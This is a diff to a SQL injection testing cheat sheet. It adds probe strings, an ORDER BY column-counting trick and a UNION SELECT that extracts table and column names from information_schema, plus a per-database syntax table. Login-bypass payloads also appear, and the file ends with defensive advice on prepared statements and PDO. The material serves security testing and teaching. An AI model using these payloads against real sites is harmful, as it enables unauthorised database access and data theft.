@@ -1,5 +1,45 @@
 This file contains all popular SQL injections for testing
 
+Examples for testing SQL-Injections for URL
+Test URL
+http://web.site/?search=111
+Examples
+http://web.site/?search=1'
+http://web.site/?search=1"
+http://web.site/?search=1 order by 1000
+http://web.site/?search=1'--
+http://web.site/?search=1'/*
+http://web.site/?search=1'#
+http://web.site/?search=1 and 1=1--
+http://web.site/?search=1 and 1=2--
+http://web.site/?search=1' and '1'='1
+and so on...
+
+Example of attack
+http://web.site/?search=1+order+by+1000
+error
+Unknown column '1000' in 'order clause'
+attack
+http://web.site/?search=1+union+select+0,concat_ws(0x3a,table_name,column_name)+from+information_schema.columns
+
+Simple table for helping testing
+
+                             MySQL             MSSQL       MS Access       Oracle         DB2         PostgreSQL
+String concat      :        concat(,)          ''+''        ""&""          ''||''      " concat "       ''||''
+                        concat_ws(delim,)                                                ""+""
+                                                                                         ''||''
+Comments           :    -- and /**/ and #   -- and /*         No          -- and /*        --          -- and /*
+Union in query     :         union          union and ;     union           union        union        union and ;
+Subqueries         :        v.4.1 >=            Yes           No            Yes           Yes             Yes
+Stored procedures  :          No                Yes           No            Yes            No             Yes
+information_schema 
+or analogs         :        v.5.0 >=            Yes          Yes            Yes           Yes             Yes
+
+Examples for different DB
+MySQL: SELECT * from table where id = 1 union select 1,2,3
+PostgreSQL: SELECT * from table where id = 1; select 1,2,3
+Oracle: SELECT * from table where id = 1 union select null,null,null from sys.dual
+
 Authentification field/login
 
 q' or 1=1; -- 
@@ -17,6 +57,7 @@ check unstring types for example
 $q = "SELECT * FROM `tab` WHERE `id` = ".$_GET['user_id'];
 $q = "SELECT * FROM `tab` WHERE `id` = ".intval($_GET['user_id']);
 
-use prepared statement 
+use Prepared Statements (PS)
+PS in signin.php is a good protection from SQL-Injections
 
 use PDO
